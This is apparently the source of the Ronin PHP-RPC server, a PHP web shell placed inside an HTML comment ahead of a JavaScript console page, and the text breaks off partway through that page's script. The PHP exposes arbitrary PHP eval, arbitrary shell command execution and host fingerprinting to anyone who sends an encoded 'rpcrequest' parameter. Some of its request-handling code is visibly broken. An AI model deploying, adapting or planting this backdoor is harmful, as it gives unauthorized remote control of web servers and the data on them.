<!--
<?php
#
# Ronin PHP-RPC Server - A PHP-RPC server designed to work in hostile
# environments.
#
# Copyright (c) 2007-2009
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

/**
 * PHP MsgPack encode/decode
 * http://code.google.com/p/msgpack-php
 * MsgPack: http://msgpack.sourceforge.net/
 *
 * Author: S.Schwuchow http://www.Schottenland.de
 *
 * @TODO check signed int >16bit
 * @TODO raise more warning of php incompatiblities
 * @TODO check float twice
 * @TODO build a big and complex test binaryString from other implementation and test against it
 *
 *
 */
class MsgPack_Coder {

	// fixed length
	const VALUE_SCALAR_NULL = 192; // xC0
	const VALUE_SCALAR_FALSE = 194; // xC2
	const VALUE_SCALAR_TRUE = 195; // xC3
	const VALUE_SCALAR_FLOAT = 202; // xCA
	const VALUE_SCALAR_DOUBLE = 203; // xCB
	// x00-x7f - integer 0-127 positive fixnum
	const VALUE_INT_FIX_NEGATIVE = 224; // 111XXXXX xE0-xFF -1 - -32 // unclear 11100000 = -1 ??
	const VALUE_INT_UNSIGNED_8 = 204; // xCC + 1 byte
	const VALUE_INT_UNSIGNED_16 = 205; // xCD + 2 byte
	const VALUE_INT_UNSIGNED_32 = 206; // xCE + 4 byte
	const VALUE_INT_UNSIGNED_64 = 207; // xCF + 8 byte
	const VALUE_INT_SIGNED_8 = 208; // xD0 + 1 byte
	const VALUE_INT_SIGNED_16 = 209; // xD1 + 2 byte
	const VALUE_INT_SIGNED_32 = 210; // xD2 + 4 byte
	const VALUE_INT_SIGNED_64 = 211; // xD3 + 8 byte
	// raw bytes
	const VALUE_RAW_FIX = 160; // xA0 101XXXXX + max 31 byte len
	const VALUE_RAW_16 = 218; // xDA save raw bytes up to (2^16)-1 bytes.
	const VALUE_RAW_32 = 219; // xDB save raw bytes up to (2^32)-1 bytes.
	// container
	const VALUE_LIST_FIX = 144; // x90 1001XXXX save an array up to 15 elements. 
	const VALUE_LIST_16 = 220; // xDC save an array up to (2^16)-1 elements. 
	const VALUE_LIST_32 = 221; // xDD save an array up to (2^32)-1 elements. 
	const VALUE_MAP_FIX = 128; // x80 1000XXXX save a map up to 15 elements. odd elements are key and next element of the key is its associate value.
	const VALUE_MAP_16 = 222; // xDE save a map up to (2^16)-1 elements. odd elements are key and next element of the key is its associate value.
	const VALUE_MAP_32 = 223; // xDF save a map up to (2^32)-1 elements. odd elements are key and next element of the key is its associate value.

	/**
	 * encode a PHP-Variable to binary MsgPack String
	 *
	 * @static
	 * @param mixed $message
	 * @return string
	 */
	static public function encode($message) {
		$messagePack = null;
		if( $message===null ) {
			$messagePack.= chr(self::VALUE_SCALAR_NULL);
		} elseif( $message===true ) {
			$messagePack.= chr(self::VALUE_SCALAR_TRUE);
		} elseif( $message===false ) {
			$messagePack.= chr(self::VALUE_SCALAR_FALSE);
		} elseif( is_double($message) ) {
			$binary = pack("d", $message);
			if( strlen($binary)==4 ) {
				$messagePack.= chr(self::VALUE_SCALAR_FLOAT).$binary;
			} elseif( strlen($binary)==8 ) {
				$messagePack.= chr(self::VALUE_SCALAR_DOUBLE).$binary;
			} else {
				user_error(__METHOD__.': unexpected pack() result-len!', E_USER_ERROR);
				$messagePack.= self::VALUE_SCALAR_NULL;
			}
		} elseif( is_float($message) ) {
			// it look like a float is always a double...
			$binary = pack("f", $message);
			if( strlen($binary)==4 ) {
				$messagePack.= chr(self::VALUE_SCALAR_FLOAT).$binary;
			} elseif( strlen($binary)==8 ) {
				$messagePack.= chr(self::VALUE_SCALAR_DOUBLE).$binary;
			} else {
				user_error(__METHOD__.': unexpected pack() result-len!', E_USER_ERROR);
				$messagePack.= self::VALUE_SCALAR_NULL;
			}
		} elseif( is_int($message) ) {
			if( $message<0 ) {
				if( $message>=-32 ) {
					$messagePack.= pack('c',$message);
				} elseif( $message>=-128 ) {
					$messagePack.= chr(self::VALUE_INT_SIGNED_8);
					$messagePack.= pack('c',$message); // signed char
				} elseif( $message>=-65535 ) {
					$messagePack.= chr(self::VALUE_INT_SIGNED_16);
					$messagePack.= self::getNibblesFromInt(65536+$message, 2); // FF FF = -1
				} elseif( $message>=-pow(2,32)-1 ) {
					$messagePack.= chr(self::VALUE_INT_SIGNED_32);
					$messagePack.= self::getNibblesFromInt(abs($message), 4);
				} else {
					$messagePack.= chr(self::VALUE_INT_SIGNED_64);
					$messagePack.= self::getNibblesFromInt(abs($message), 8);
				}
			} elseif( $message<=127 ) {
				$messagePack.= chr($message);
			} elseif( $message<=255 ) {
				$messagePack.= chr(self::VALUE_INT_UNSIGNED_8);
				$messagePack.= self::getNibblesFromInt($message, 1);
			} elseif( $message<=65535 ) {
				$messagePack.= chr(self::VALUE_INT_UNSIGNED_16);
				$messagePack.= self::getNibblesFromInt($message, 2);
			} elseif( $message<=pow(2,32)-1 ) {
				$messagePack.= chr(self::VALUE_INT_UNSIGNED_32);
				$messagePack.= self::getNibblesFromInt($message, 4);
			} else {
				$messagePack.= chr(self::VALUE_INT_UNSIGNED_64);
				$messagePack.= self::getNibblesFromInt($message, 8);
			}
		} elseif( is_string($message) ) {
			$len = strlen($message);
			if( $len<=31 ) {
				$messagePack.= chr(self::VALUE_RAW_FIX+$len);
			} elseif( $len<=65535 ) { // 2^16-1
				$messagePack.= chr(self::VALUE_RAW_16);
				$messagePack.= self::getNibblesFromInt($len, 2);
			} else {
				$messagePack.= chr(self::VALUE_RAW_32);
				$messagePack.= self::getNibblesFromInt($len, 4);
			}
			$messagePack.= $message;
		} elseif( is_array($message) ) {
			$assoc = false;
			$index = 0;
			foreach( $message as $key=>$value ) {
				if( $key!=$index++ ) { // key ist nicht index
					$assoc = true;
					break;
				}
			}
			$count = count($message);
			if( $count<=15 ) {
				if( $assoc ) {
					$messagePack.= chr(self::VALUE_MAP_FIX+$count);
				} else {
					$messagePack.= chr(self::VALUE_LIST_FIX+$count);
				}
			} elseif( $count<65536) {
				if( $assoc ) {
					$messagePack.= chr(self::VALUE_MAP_16);
				} else {
					$messagePack.= chr(self::VALUE_LIST_16);
				}
				$messagePack.= self::getNibblesFromInt($count, 2);
			} else {
				if( $assoc ) {
					$messagePack.= chr(self::VALUE_MAP_32);
				} else {
					$messagePack.= chr(self::VALUE_LIST_32);
				}
				$messagePack.= self::getNibblesFromInt($count, 4);
			}
			foreach( $message as $key=>$value ) {
				if( $assoc ) {
					$messagePack.= self::encode($key);
				}
				$messagePack.= self::encode($value);
			}
		} else {
			$messagePack = 'encoding failed! messagepack:'.$messagePack;
		}
		return $messagePack;
	}



	/**
	 * decode a MsgPack to php-Variable
	 * the affected bytes will be removed
	 *
	 * @static
	 * @param string $messagePack
	 * @return mixed
	 */
	static public function decode(&$messagePack) {
		$message = null;
		$messageByte = ord(substr($messagePack,0,1));
		$messagePack = substr($messagePack,1);
		if( $messageByte==self::VALUE_SCALAR_NULL ) {
			$message = null;
		} elseif( $messageByte==self::VALUE_SCALAR_TRUE ) {
			$message = true;
		} elseif( $messageByte==self::VALUE_SCALAR_FALSE ) {
			$message = false;
		} elseif( $messageByte==self::VALUE_SCALAR_DOUBLE ) {
			$unpack = unpack('d', $messagePack);
			$message = $unpack[1];
			$messagePack = substr($messagePack, 8);
		} elseif( $messageByte==self::VALUE_SCALAR_FLOAT ) {
			// it seem that unpack('f'... returns a double, so the result can be different from source e.g. for 1.3 (float) = 1.29999995232 (double)
			$unpack = unpack('f', $messagePack);
			$message = $unpack[1];
			$messagePack = substr($messagePack, 4);
		} elseif( $messageByte<=127 ) {
			$message = $messageByte;
		} elseif( $messageByte==self::VALUE_INT_UNSIGNED_8 ) {
			$message = self::getIntFromMessagePack($messagePack, 1);
		} elseif( $messageByte==self::VALUE_INT_UNSIGNED_16 ) {
			$message = self::getIntFromMessagePack($messagePack, 2);
		} elseif( $messageByte==self::VALUE_INT_UNSIGNED_32 ) {
			$message = self::getIntFromMessagePack($messagePack, 4);
		} elseif( $messageByte==self::VALUE_INT_UNSIGNED_64 ) {
			$message = self::getIntFromMessagePack($messagePack, 8);
		} elseif( $messageByte>=self::VALUE_INT_FIX_NEGATIVE AND $messageByte<=self::VALUE_INT_FIX_NEGATIVE+31) {
			$message = -256+$messageByte;
		} elseif( $messageByte==self::VALUE_INT_SIGNED_8 ) {
			$message = -256+self::getIntFromMessagePack($messagePack, 1);
		} elseif( $messageByte==self::VALUE_INT_SIGNED_16 ) {
			$message = -65536+self::getIntFromMessagePack($messagePack, 2);
		} elseif( $messageByte==self::VALUE_INT_SIGNED_32 ) {
			$message = 0-self::getIntFromMessagePack($messagePack, 4);
		} elseif( $messageByte==self::VALUE_INT_SIGNED_64 ) {
			$message = 0-self::getIntFromMessagePack($messagePack, 8);
		} elseif( $messageByte>=self::VALUE_RAW_FIX AND $messageByte<=self::VALUE_RAW_FIX+31) {
			$len = $messageByte-self::VALUE_RAW_FIX;
			$message = substr($messagePack,0,$len);
			$messagePack = substr($messagePack,$len);
		} elseif( $messageByte==self::VALUE_RAW_16 ) {
			$len = self::getIntFromMessagePack($messagePack,2);
			$message = substr($messagePack,0,$len);
			$messagePack = substr($messagePack,$len);
		} elseif( $messageByte==self::VALUE_RAW_32 ) {
			$len = self::getIntFromMessagePack($messagePack,4);
			$message = substr($messagePack,0,$len);
			$messagePack = substr($messagePack,$len);
		} elseif( $messageByte>=self::VALUE_LIST_FIX AND $messageByte<=self::VALUE_LIST_FIX+15) {
			$count = $messageByte-self::VALUE_LIST_FIX;
			$message = self::getArrayFromMessagesPack($messagePack, $count, false);
		} elseif( $messageByte>=self::VALUE_MAP_FIX AND $messageByte<=self::VALUE_MAP_FIX+15) {
			$count = $messageByte-self::VALUE_MAP_FIX;
			$message = self::getArrayFromMessagesPack($messagePack, $count, true);
		} elseif( $messageByte==self::VALUE_LIST_16 ) {
			$len = self::getIntFromMessagePack($messagePack, 2);
			$message = self::getArrayFromMessagesPack($messagePack, $len, false);
		} elseif( $messageByte==self::VALUE_LIST_32 ) {
			$len = self::getIntFromMessagePack($messagePack, 4);
			$message = self::getArrayFromMessagesPack($messagePack, $len, false);
		} elseif( $messageByte==self::VALUE_MAP_16 ) {
			$len = self::getIntFromMessagePack($messagePack, 2);
			$message = self::getArrayFromMessagesPack($messagePack, $len, true);
		} elseif( $messageByte==self::VALUE_MAP_32 ) {
			$len = self::getIntFromMessagePack($messagePack, 4);
			$message = self::getArrayFromMessagesPack($messagePack, $len, true);
		} else {
			$message = 'resolve Failed';
		}
		return $message;
	}

	/**
	 * dump a binary String for debugging
	 * @static
	 * @param string $messagePack
	 * @return string
	 */
	static public function hexDump($messagePack) {
		$out = '';
		for($i=0; $i<strlen($messagePack); $i++) {
			$out.= ' '.dechex(ord($messagePack[$i]));
		}
		return $out;
	}

	/**
	 * build binary Nibbles for PHP-int
	 * @static
	 * @param int $value
	 * @param int $len
	 * @return string
	 */
	static protected function getNibblesFromInt($intValue, $len) {
		$result = '';
		for($i=1; $i<=$len; $i++ ) {
			$result = chr($intValue % 256).$result;
			$intValue = $intValue/256;
		}
		return $result;
	}
	/**
	 * get an PHP-Int from binary String
	 * the affected bytes will by removed
	 *
	 * @static
	 * @param string $messagePack
	 * @param int $len
	 * @return int
	 */
	static protected function getIntFromMessagePack(&$messagePack, $len) {
		$int = 0;
		for($i=0; $i<$len; $i++ ) {
			$int += ord(substr($messagePack,$len-1-$i,1)) * pow(2,$i*8);
		}
		$messagePack = substr($messagePack,$len);
		return $int;
	}

	/**
	 * get an PHP-Array from binary string
	 * the affected bytes will be removed
	 *
	 * @static
	 * @param string $messagePack
	 * @param int $count
	 * @param bool $assoc
	 * @return array
	 */
#segfault	static protected function getArrayFromMessagesPack(string &$messagePack, int $count, boolean $assoc) {
	static protected function getArrayFromMessagesPack(&$messagePack, $count, $assoc) {
		$message = array();
		for( $i=0; $i<$count; $i++ ) {
			if( $assoc ) {
				$message[self::decode($messagePack)] = self::decode($messagePack);
			} else {
				$message[] = self::decode($messagePack);
			}
		}
		return $message;
	}

}

class RPCServer
{
  var $methods;

  var $services;

  function RPCServer()
  {
    $this->methods = array();
    $this->services = array();
  }

  function error_msg($message)
  {
    return array(
      'type' => 'error',
      'message' => $message
    );
  }

  function return_msg($state,$output,$return_value)
  {
    return array(
      'type' => 'return',
      'state' => $state,
      'output' => $output,
      'return_value' => $return_value,
    );
  }

  function load_state($state)
  {
    foreach ($state as $name => $values)
    {
      if (isset($this->services[$name]))
      {
        foreach ($this->services[$name]->persistant as $var)
        {
          if (isset($values[$var]))
          {
            $this->services[$name]->$var = $values[$var];
          }
        }
      }
    }
  }

  function register_method($name,$function)
  {
    $this->methods[$name] = $function;
  }

  function register_service($name,&$service)
  {
    $this->services[$name] =& $service;

    foreach ($service->methods as $rpc_name => $method)
    {
      $this->register_method("{$name}.{$rpc_name}",array(&$service, $method));
    }
  }

  function call_method($request)
  {
    if (!is_array($request))
    {
      return $this->error_msg('Invalid Request message');
    }

    if (!$request['name'])
    {
      return $this->error_msg('Invalid Method Call');
    }

    $method_name = $request['name'];

    if (!$this->methods[$method_name])
    {
      return $this->error_msg('Unknown method: ' + $method_name);
    }

    $state = $request['state'];

    if ($state)
    {
      $server->load_state($state);
    }

    $func = $server->methods[$method];
    $arguments = $request['arguments'];

    if (!$arguments)
    {
      $arguments = array();
    }

    ob_start();

    $return_value = call_user_func_array($func,$arguments);

    $output = ob_get_contents();
    ob_end_clean();

    $updated_state = $this->save_state();

    return $this->return_msg($updated_state,$output,$return_value);
  }

  function rpc_services($method)
  {
    return array_keys($this->services);
  }

  function save_state()
  {
    $state = array();

    foreach ($this->services as $name => $service)
    {
      $state[$name] = array();

      foreach ($service->persistant as $var)
      {
        $state[$name][$var] = $service->$var;
      }
    }

    return $state;
  }
}

class Service
{
  var $methods;

  var $persistant;

  function Service()
  {
    $this->methods = array();
    $this->persistant = array();
  }

  function is_windows()
  {
    return substr(PHP_OS, 0, 3) == 'WIN';
  }
}

class ConsoleService extends Service
{
  var $includes;

  function ConsoleService()
  {
    $this->includes = array();
    $this->methods = array(
      'invoke' => 'rpc_invoke',
      'eval' => 'rpc_eval',
      'inspect' => 'rpc_inspect'
    );

    $this->persistant = array('includes');
  }

  function rpc_invoke($params)
  {
    $name = $params[0];
    $arguments = $params[1];
    $call_arguments = array();

    if ($arguments != null)
    {
      foreach(array_keys($arguments) as $index)
      {
        $call_arguments[$index] = "\$arguments[{$index}]";
      }
    }

    $call_string = "return {$name}(" . join(", ", $call_arguments) . ");";

    $ret = eval($call_string);

    if (($name == 'include' || $name == 'require') && $ret != false)
    {
      $this->includes[] = $arguments[0];
    }

    return $ret;
  }

  function rpc_eval($params)
  {
    $code = trim($params[0]);

    if ($code[strlen($code) - 1] != ';')
    {
      $code .= ';';
    }

    return eval('return ' . $code);
  }

  function rpc_inspect($params)
  {
    $ret = $this->rpc_eval($params);

    ob_start();
    print_r($ret);
    $output = ob_get_contents();
    ob_end_clean();

    return $output;
  }
}

class ShellService extends Service
{
  var $cwd;

  var $env;

  function ShellService()
  {
    $this->cwd = getcwd();
    $this->env = array();

    $this->methods = array(
      'exec' => 'rpc_exec',
      'cd' => 'rpc_cd',
      'cwd' => 'rpc_cwd',
      'env' => 'rpc_env',
      'getenv' => 'rpc_getenv',
      'setenv' => 'rpc_setenv'
    );

    $this->persistant = array('cwd', 'env');
  }

  function format($obj)
  {
    if (is_array($obj))
    {
      $formatted = array();

      foreach($obj as $value)
      {
        $formatted[] = $this->format($value);
      }

      return join(' ', $formatted);
    }
    else if ($obj == null)
    {
      return '';
    }

    return "{$obj}";
  }

  function exec_output($command)
  {
    ob_start();

    passthru($command);

    $output = ob_get_contents();
    ob_end_clean();
    return split("\n",rtrim($output,"\n\r"));
  }

  function load_env()
  {
    if ($this->is_windows())
    {
      $command = 'set';
    }
    else
    {
      $command = 'env';
    }

    $this->env = array();

    foreach ($this->exec_output($command) as $line)
    {
      list($name, $value) = explode('=', $line, 2);
      $this->env[$name] = $value;
    }
  }

  function rpc_cwd($params=array())
  {
    return $this->cwd;
  }

  function rpc_cd($params)
  {
    $new_cwd = $params[0];

    if ($new_cwd[0] != DIRECTORY_SEPARATOR)
    {
      $new_cwd = $this->cwd . DIRECTORY_SEPARATOR . $new_cwd;
    }

    $new_cwd = realpath($new_cwd);

    if (file_exists($new_cwd))
    {
      $this->cwd = $new_cwd;
      return true;
    }

    return false;
  }

  function rpc_env($params=array())
  {
    return $this->env;
  }

  function rpc_getenv($params)
  {
    return $this->env[$params[0]];
  }

  function rpc_setenv($params)
  {
    return $this->env[$params[0]] = $params[1];
  }

  function rpc_exec($params)
  {
    $command = 'cd ' . $this->cwd . '; ';

    if (count($params) > 1)
    {
      $command .= array_shift($params) . ' ' . $this->format($params);
    }
    else
    {
      $command .= $params[0];
    }

    $command .= '; pwd';

    $output = $this->exec_output($command);
    $this->cwd = array_pop($output);

    $output_string = '';

    foreach ($output as $line)
    {
      $output_string .= "{$line}\n";
    }

    return $output_string;
  }
}

function running($params=array())
{
  return true;
}

function fingerprint($params=array())
{
  $profile = array(
    'os' => PHP_OS,
    'system_name' => php_uname('s'),
    'system_release' => php_uname('r'),
    'system_version' => php_uname('v'),
    'machine_type' => php_uname('m'),
    'host_name' => php_uname('n'),
    'php_server_api' => php_sapi_name(),
    'php_version' => phpversion(),
    'uid' => posix_getuid(),
    'gid' => posix_getgid(),
    'cwd' => getcwd(),
    'disk_free_space' => disk_free_space('/'),
    'disk_total_space' => disk_total_space('/')
  );

  switch ($profile['php_server_api'])
  {
  case 'apache':
    $profile['apache_version'] = apache_get_version();
    break;
  }

  return $profile;
}

#
# Inlined PHP: Start
#

#
# Inlined PHP: End
#

if (isset($_REQUEST['rpcrequest']))
{
  $server = new RPCServer();
  $server->register_method('running', 'running');
  $server->register_method('fingerprint', 'fingerprint');
  $server->register_service('console', new ConsoleService());
  $server->register_service('shell', new ShellService());

  $request = $_REQUEST['rpcrequest'];
  $call = MsgPack_Coder::decode(base64_decode(rawurldecode($request)));
  $return_value = $server->call_method($call);
  $response = base64_encode(MsgPack_Coder::encode($return_value));

  echo("<rpc-response>{$response}</rpc-response>");
  exit;
}

?>
-->

<html>
  <head>
    <title>Ronin::PHP - AJAX PHP-RPC Console</title>
    <style type="text/css">#console_container{float:left;margin:0 20% 0 20%;padding:1em;width:60%;z-index:10000;background-color:white;color:black;font-family:Helvetica;font-size:.8em;}#console_title{font-weight:bold;}#console_content{background-color:black;}.ui-tabs-hide{display:none;}.ui-tabs-nav{float:right;margin:0;padding:.5em 0 0 .5em;list-style:none;}.ui-tabs-nav:after{display:block;clear:both;content:" ";}.ui-tabs-nav li{float:left;margin:0 0 0 2px;font-weight:bold;}.ui-tabs-nav a{float:left;margin-left:1em;margin-right:1em;color:white;text-decoration:none;}.ui-tabs-nav a span{float:left;}.ui-tabs-nav .ui-tabs-selected a{text-decoration:underline;border-bottom:2px solid white;}div.console_tab{clear:right;margin:0;padding:0 1em 1em 1em;}div.console_tab h2{color:white;font-weight:bold;}div.console_tab a{color:white;text-decoration:none;border-bottom:1px dotted gray;}div.console_tab a:hover{color:white;text-decoration:none;border-bottom:1px solid white;}div.console_tab button{color:white;background-color:black;border:2px solid white;}div.console_dialogue{margin:0;padding:1em;background-color:#c3c3c3;}.terminal_textarea{padding:.125em;width:100%;color:white;font-family:monospace;font-size:1.2em;background-color:black;border:2px solid white;}textarea.terminal_textarea{height:auto;margin:0 0 .5em 0;}input.terminal_textarea{margin:.5em 0 0 0;}</style>
    <script type="text/javascript">
base64={};base64.PADCHAR='=';base64.ALPHA='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';base64.getbyte64=function(s,i){var idx=base64.ALPHA.indexOf(s.charAt(i));if(idx==-1){throw"Cannot decode base64";}
return idx;}
base64.decode=function(s){s=""+s;var getbyte64=base64.getbyte64;var pads,i,b10;var imax=s.length
if(imax==0){return s;}
if(imax%4!=0){throw"Cannot decode base64";}
pads=0
if(s.charAt(imax-1)==base64.PADCHAR){pads=1;if(s.charAt(imax-2)==base64.PADCHAR){pads=2;}
imax-=4;}
var x=[];for(i=0;i<imax;i+=4){b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6)|getbyte64(s,i+3);x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff,b10&0xff));}
switch(pads){case 1:b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12)|(getbyte64(s,i+2)<<6)
x.push(String.fromCharCode(b10>>16,(b10>>8)&0xff));break;case 2:b10=(getbyte64(s,i)<<18)|(getbyte64(s,i+1)<<12);x.push(String.fromCharCode(b10>>16));break;}
return x.join('');}
base64.getbyte=function(s,i){var x=s.charCodeAt(i);if(x>255){throw"INVALID_CHARACTER_ERR: DOM Exception 5";}
return x;}
base64.encode=function(s){if(arguments.length!=1){throw"SyntaxError: Not enough arguments";}
var padchar=base64.PADCHAR;var alpha=base64.ALPHA;var getbyte=base64.getbyte;var i,b10;var x=[];s=""+s;var imax=s.length-s.length%3;if(s.length==0){return s;}
for(i=0;i<imax;i+=3){b10=(getbyte(s,i)<<16)|(getbyte(s,i+1)<<8)|getbyte(s,i+2);x.push(alpha.charAt(b10>>18));x.push(alpha.charAt((b10>>12)&0x3F));x.push(alpha.charAt((b10>>6)&0x3f));x.push(alpha.charAt(b10&0x3f));}
switch(s.length-imax){case 1:b10=getbyte(s,i)<<16;x.push(alpha.charAt(b10>>18)+alpha.charAt((b10>>12)&0x3F)+
padchar+padchar);break;case 2:b10=(getbyte(s,i)<<16)|(getbyte(s,i+1)<<8);x.push(alpha.charAt(b10>>18)+alpha.charAt((b10>>12)&0x3F)+
alpha.charAt((b10>>6)&0x3f)+padchar);break;}
return x.join('');}</script>
    <script type="text/javascript">
MessagePack={};MessagePack.unpack=function(data){var unpacker=new MessagePack.Decoder(data);return unpacker.unpack();};MessagePack.UTF8=0;MessagePack.ASCII8bit=1;MessagePack.UTF16=2;MessagePack.ByteArray=-1;MessagePack.CharSet=MessagePack.UTF8;MessagePack.Decoder=function(data,charSet){this.index=0;if(MessagePack.hasVBS){if(typeof(data)=="unknown"){this.length=msgpack_getLength(data);this.byte_array_to_string(data);}else{this.length=msgpack_getLength(data);this.data=data;}}else{this.length=data.length;this.data=data;}
charSet=charSet||MessagePack.CharSet||0;if(charSet=='utf-8'){charSet=MessagePack.UTF8;}
else if(charSet=='ascii'){charSet=MessagePack.ASCII8bit;}
else if(charSet=='utf16'){charSet=MessagePack.UTF16;}
else if(charSet=='byte-array'){charSet=MessagePack.ByteArray;}
else{charSet=MessagePack.UTF8;}}
if(typeof execScript!='undefined'){execScript('Dim g_msgpack_binary_data\n'+'Sub msgpack_set_binary_data(binary)\n'+'    g_msgpack_binary_data = binary\n'+'End Sub\n'+'Function msgpack_getByte(pos)\n'+'  msgpack_getByte = AscB(MidB(g_msgpack_binary_data, pos + 1, 1))\n'+'End Function\n',"VBScript");execScript('Function msgpack_substr(pos, len)\n'+'  Dim array()\n'+'  ReDim array(len)\n'+'  For i = 1 To len\n'+'    array(i-1) = AscB(MidB(g_msgpack_binary_data, pos + i, 1))\n'+'  Next\n'+'  msgpack_substr = array\n'+'End Function\n'+'Function msgpack_getLength(data)\n'+'  msgpack_getLength = LenB(data)\n'+'End Function\n'+'\n','VBScript');}
MessagePack.hasVBS='msgpack_getByte'in this;with({p:MessagePack.Decoder.prototype}){p.unpack=function(){var type=this.unpack_uint8();if(type<0x80){var positive_fixnum=type;return positive_fixnum;}else if((type^0xe0)<0x20){var negative_fixnum=(type^0xe0)-0x20;return negative_fixnum;}
var size;if((size=type^0xa0)<=0x1f){return this.unpack_raw(size);}else if((size=type^0x90)<=0x0f){return this.unpack_array(size);}else if((size=type^0x80)<=0x0f){return this.unpack_map(size);}
switch(type){case 0xc0:return null;case 0xc1:return undefined;case 0xc2:return false;case 0xc3:return true;case 0xca:return this.unpack_float();case 0xcb:return this.unpack_double();case 0xcc:return this.unpack_uint8();case 0xcd:return this.unpack_uint16();case 0xce:return this.unpack_uint32();case 0xcf:return this.unpack_uint64();case 0xd0:return this.unpack_int8();case 0xd1:return this.unpack_int16();case 0xd2:return this.unpack_int32();case 0xd3:return this.unpack_int64();case 0xd4:return undefined;case 0xd5:return undefined;case 0xd6:return undefined;case 0xd7:return undefined;case 0xd8:return undefined;case 0xd9:return undefined;case 0xda:size=this.unpack_uint16();return this.unpack_raw(size);case 0xdb:size=this.unpack_uint32;return this.unpack_raw(size);case 0xdc:size=this.unpack_uint16();return this.unpack_array(size);case 0xdd:size=this.unpack_uint32();return this.unpack_array(size);case 0xde:size=this.unpack_uint16();return this.unpack_map(size);case 0xdf:size=this.unpack_uint32();return this.unpack_map(size);}}
p.unpack_uint8=function(){var byte=this.getc()&0xff;this.index++;return byte;};p.unpack_uint16=function(){var bytes=this.read(2);var uint16=((bytes[0]&0xff)*256)+(bytes[1]&0xff);this.index+=2;return uint16;}
p.unpack_uint32=function(){var bytes=this.read(4);var uint32=((bytes[0]*256+
bytes[1])*256+
bytes[2])*256+
bytes[3];this.index+=4;return uint32;}
p.unpack_uint64=function(){var bytes=this.read(8);var uint64=((((((bytes[0]*256+
bytes[1])*256+
bytes[2])*256+
bytes[3])*256+
bytes[4])*256+
bytes[5])*256+
bytes[6])*256+
bytes[7];this.index+=8;return uint64;}
p.unpack_int8=function(){var uint8=this.unpack_uint8();return(uint8<0x80)?uint8:uint8-(1<<8);};p.unpack_int16=function(){var uint16=this.unpack_uint16();return(uint16<0x8000)?uint16:uint16-(1<<16);}
p.unpack_int32=function(){var uint32=this.unpack_uint32();return(uint32<Math.pow(2,31))?uint32:uint32-Math.pow(2,32);}
p.unpack_int64=function(){var uint64=this.unpack_uint64();return(uint64<Math.pow(2,63))?uint64:uint64-Math.pow(2,64);}
p.unpack_raw=function(size){if(this.length<this.index+size){throw new Error("MessagePackFailure: index is out of range"
+" "+this.index+" "+size+" "+this.length);}
var bytes=this.read(size);this.index+=size;if(this.charSet==MessagePack.ASCII8bit){return String.fromCharCode.apply(String,bytes);}else if(this.charSet==MessagePack.ByteArray){return bytes;}
else{var i=0,str="",c,code;while(i<size){c=bytes[i];if(c<128){str+=String.fromCharCode(c);i++;}
else if((c^0xc0)<32){code=((c^0xc0)<<6)|(bytes[i+1]&63);str+=String.fromCharCode(code);i+=2;}
else{code=((c&15)<<12)|((bytes[i+1]&63)<<6)|(bytes[i+2]&63);str+=String.fromCharCode(code);i+=3;}}
return str;}}
p.unpack_array=function(size){var objects=new Array(size);for(var i=0;i<size;i++){objects[i]=this.unpack();}
return objects;}
p.unpack_map=function(size){var map={};for(var i=0;i<size;i++){var key=this.unpack();var value=this.unpack();map[key]=value;}
return map;}
p.unpack_float=function(){var uint32=this.unpack_uint32();var sign=uint32>>31;var exp=((uint32>>23)&0xff)-127;var fraction=(uint32&0x7fffff)|0x800000;return(sign==0?1:-1)*fraction*Math.pow(2,exp-23);}
p.unpack_double=function(){var h32=this.unpack_uint32();var l32=this.unpack_uint32();var sign=h32>>31;var exp=((h32>>20)&0x7ff)-1023;var hfrac=(h32&0xfffff)|0x100000;var frac=hfrac*Math.pow(2,exp-20)+
l32*Math.pow(2,exp-52);return(sign==0?1:-1)*frac;}
p.byte_array_to_string=function(data){var binary_to_js_array_hex=function(binary){var xmldom=new ActiveXObject("Microsoft.XMLDOM");var bin=xmldom.createElement("bin");bin.nodeTypedValue=data;bin.dataType="bin.hex";var text=bin.text;var size=text.length;return function(start,length){var i=0,chunk=4,bytes=[]
chunk2=chunk*2,hex,int32;for(;i+3<length;i+=4){hex=text.substr(2*(i+start),chunk2);int32=parseInt(hex,16);bytes[i]=(int32>24)&0xff;bytes[i+1]=(int32>16)&0xff;bytes[i+2]=(int32>8)&0xff;bytes[i+3]=int32&0xff;}
for(i-=3;i<length;i++){hex=this.data.substr(2*(i+start),2);bytes[i]=parseInt(hex,16);}
return bytes;}}
var binary_to_js_array_base64=function(binary){var chr2index={};var text;(function(){var xmldom=new ActiveXObject("Microsoft.XMLDOM");var bin=xmldom.createElement("bin");bin.dataType="bin.base64";bin.nodeTypedValue=binary;text=bin.text.replace(/[^A-Za-z0-9\+\/\=]/g,"");var b64map="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";for(var i=0,length=b64map.length;i<length;i++){chr2index[b64map.charAt(i)]=i;}})();var chr2,chr3,prev_i=0;return function(start,length){var bytes,last_pos=Math.floor(3*prev_i/4);switch(last_pos-start){case 2:bytes=[chr2,chr3];break;case 1:bytes=[chr3];break;default:bytes=[];}
var j=bytes.length;if(length<=j){bytes.length=length;return bytes;}
var i=prev_i,enc1,enc2,enc3,enc4,last=4*Math.ceil((start+length)/3);while(i<last){enc1=chr2index[text.charAt(i++)];enc2=chr2index[text.charAt(i++)];enc3=chr2index[text.charAt(i++)];enc4=chr2index[text.charAt(i++)];bytes[j++]=(enc1<<2)|(enc2>>4);bytes[j++]=((enc2&0x0f)<<4)|(enc3>>2);bytes[j++]=((enc3&0x03)<<6)|enc4;}
prev_i=i;chr2=bytes[j-2];chr3=bytes[j-1];bytes.length=length;return bytes;}}
